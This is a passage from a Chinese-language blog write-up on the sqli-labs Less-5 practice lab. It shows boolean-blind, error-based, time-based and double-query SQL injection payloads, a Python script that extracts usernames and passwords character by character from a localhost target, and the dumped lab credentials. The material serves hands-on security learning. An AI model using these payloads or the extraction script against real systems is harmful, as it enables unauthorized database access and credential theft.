+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 跑出来的结果</span></span><br><span class="line">a</span><br><span class="line">aa</span><br><span class="line">aaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa,</span><br><span class="line">aaaa,a</span><br><span class="line">aaaa,aa</span><br><span class="line">aaaa,aaa</span><br><span class="line">aaaa,aaaa</span><br><span class="line">aaaa,aaaaa</span><br><span class="line">aaaa,aaaaaa</span><br><span class="line">aaaa,aaaaaaa</span><br><span class="line">aaaa,aaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,a</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,i</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span></span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,u</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,us</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,use</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,user</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,usern</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,userna</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,usernam</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,p</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,pa</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,pas</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,<span class="keyword">pass</span></span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,passw</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,passwo</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,passwor</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,password</span><br><span class="line">aaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaa,<span class="built_in">id</span>,username,password</span><br><span class="line"><span class="comment"># 尼玛还有垃圾字符？</span></span><br><span class="line"><span class="comment"># 得到列名 id,username,password</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 或许我们也可以定向一波。利用 regexp 来获取列 *&#x2F;</span><br><span class="line">-- such as:</span><br><span class="line">&#x2F;* 选择 users 表中列名，看是不是有 us*** 的列 *&#x2F;</span><br><span class="line">1: and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1) --+  &#x2F;&#x2F;-- 正确回显，说明有，可以继续深入定向</span><br><span class="line">2: and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1) --+  &#x2F;&#x2F;-- 正确回显，说明存在 username</span><br><span class="line">&#x2F;* 可以依次继续推断存在 password *&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 判断 username 与 password 字段总长度内容 *&#x2F;</span><br><span class="line">?id&#x3D;1%27</span><br><span class="line">1: and (select length(group_concat(username,password)) from users) &gt; 174 --+  &#x2F;&#x2F;-- 正确回显，说明字段总长度大于 174</span><br><span class="line">2: &#x2F;&#x2F;-- ……略去过程 经过不懈尝试</span><br><span class="line">3: and (select length(group_concat(username,password)) from users) &gt; 175 --+  &#x2F;&#x2F;-- 无回显，说明字段总长度小于等于 175</span><br><span class="line">&#x2F;&#x2F; -- 以逗号相连的所字段的总长度为 175 </span><br><span class="line"></span><br><span class="line">&#x2F;* 然后可以用脚本跑 *&#x2F;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @for: 跑 username 和 password 列中字段名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有表名</span></span><br><span class="line">all_table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line">url = <span class="string">&#x27;http://localhost/sqli-labs/Less-5/?id=1%27 and ascii(substr((select group_concat(username,0x2d,0x3e,password) from users),&#123;times&#125;,1)) &gt; &#123;num&#125; --+&#x27;</span></span><br><span class="line"><span class="comment"># nums</span></span><br><span class="line">nums = [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> times <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">176</span>):</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        content = requests.get(url.<span class="built_in">format</span>(times=times, num=num)).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> content:</span><br><span class="line">            all_table_name += <span class="built_in">chr</span>(num)</span><br><span class="line">            <span class="built_in">print</span>(all_table_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(all_table_name)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于有尼玛一百多行就只贴最终结果吧</span></span><br><span class="line">Dumb-&gt;Dumb,Angelina-&gt;I-kill-you,Dummy-&gt;p@ssword,secure-&gt;crappy,stupid-&gt;stupidity,superman-&gt;genious,batman-&gt;mob!le,admin-&gt;admin,admin1-&gt;admin1,admin2-&gt;admin2,admin3-&gt;admin3,dhakkan-&gt;dumbo,admin4-&gt;admin4</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-2"><a href="#4-2" class="headerlink" title="4.2"></a>4.2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 我们也可以利用 ord 和 mid 来获取 users 表中的内容 *&#x2F;</span><br><span class="line">-- such as:</span><br><span class="line">1: and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&#x3D;68 --+</span><br><span class="line">&#x2F;&#x2F;-- 然后造轮子就可了，整个脚本直接怼上去就好辽</span><br></pre></td></tr></table></figure>
+
+<p>尼玛的，就这</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 报错莽一波 *&#x2F;</span><br><span class="line">&#x2F;* 1st *&#x2F;</span><br><span class="line">&#x2F;* concat + rand() + group_by()导致主键重复 *&#x2F;</span><br><span class="line">-- such as:</span><br><span class="line">1: union select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span><br><span class="line"></span><br><span class="line">&#x2F;* 2nd *&#x2F;</span><br><span class="line">&#x2F;* 利用 double 数据类型溢出 *&#x2F;</span><br><span class="line">-- such as:</span><br><span class="line">1: union select (exp(~(select * from (select database())a))),2,3 --+  &#x2F;&#x2F;-- 遗憾未测试成功</span><br><span class="line"></span><br><span class="line">&#x2F;* 3rd *&#x2F;</span><br><span class="line">&#x2F;* 利用 bigint 进行报错注入 *&#x2F;</span><br><span class="line">-- such as:</span><br><span class="line">1: union select (!(select * from (select database())x) - ~0),2,3 --+  &#x2F;&#x2F;-- 遗憾也未测试成功</span><br><span class="line"></span><br><span class="line">&#x2F;* 4th *&#x2F;</span><br><span class="line">&#x2F;* xpath 函数报错注入 *&#x2F;</span><br><span class="line">-- such as:</span><br><span class="line">1: and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+</span><br><span class="line">2: and updatexml(1,concat(0x7e,(select @@version),0x7e)) --+  &#x2F;&#x2F; -- Incorrect parameter count in the call to native function &#39;updatexml&#39; （显然没有成功）</span><br><span class="line"></span><br><span class="line">&#x2F;* 5th *&#x2F;</span><br><span class="line">&#x2F;* 利用数据的重复性 *&#x2F;</span><br><span class="line">-- such as:</span><br><span class="line">1: union select 1,2,3 from (select name const(version(),1),name const(version(),1))x --+  &#x2F;&#x2F;-- 同样测试失败</span><br></pre></td></tr></table></figure>
+
+<p>就这？就这？</p>
+<h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 延时快乐一下 *&#x2F;</span><br><span class="line">&#x2F;* 1st *&#x2F;</span><br><span class="line">&#x2F;* 利用 sleep 函数进行延时注入 *&#x2F;</span><br><span class="line">-- such as:</span><br><span class="line">1: and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5)) --+  &#x2F;&#x2F;-- 错误的时候会延时 5 秒（可以把人都等死）</span><br><span class="line"></span><br><span class="line">&#x2F;* 2nd *&#x2F;</span><br><span class="line">&#x2F;* 利用 benchmark 函数进行延时注入 *&#x2F;</span><br><span class="line">-- such as:</span><br><span class="line">1: union select (if(substring(current,1,1)&#x3D;char(115),benchmark(25000000,encode(&#39;msg&#39;,&#39;by 5 seconds&#39;)),null)),2,3 from (select database() as current) as tb1 --+  &#x2F;&#x2F;-- 正确的时候会运行 encode() 25000000 次，会占用时间导致延时</span><br></pre></td></tr></table></figure>
+
+<p>就这，就这</p>
+<h1 id="双注入"><a href="#双注入" class="headerlink" title="双注入"></a>双注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 双注入，听起来就挺装逼叭 *&#x2F;</span><br><span class="line">1: union select count(*),1,concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">关键源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-number">2.1.</span> <span class="toc-text">1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2"><span class="toc-number">2.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3"><span class="toc-number">2.3.</span> <span class="toc-text">3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">3.2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4"><span class="toc-number">2.4.</span> <span class="toc-text">4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2"><span class="toc-number">2.4.1.</span> <span class="toc-text">4.2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">双注入</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&text=对于 sqli-labs Less5 的思考"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&is_video=false&description=对于 sqli-labs Less5 的思考"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=对于 sqli-labs Less5 的思考&body=Check out this article: http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&title=对于 sqli-labs Less5 的思考"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&name=对于 sqli-labs Less5 的思考&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/04/08/%E5%AF%B9%E4%BA%8E-sqli-labs-Less5-%E7%9A%84%E6%80%9D%E8%80%83/&t=对于 sqli-labs Less5 的思考"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Du1L0v3
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+         <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
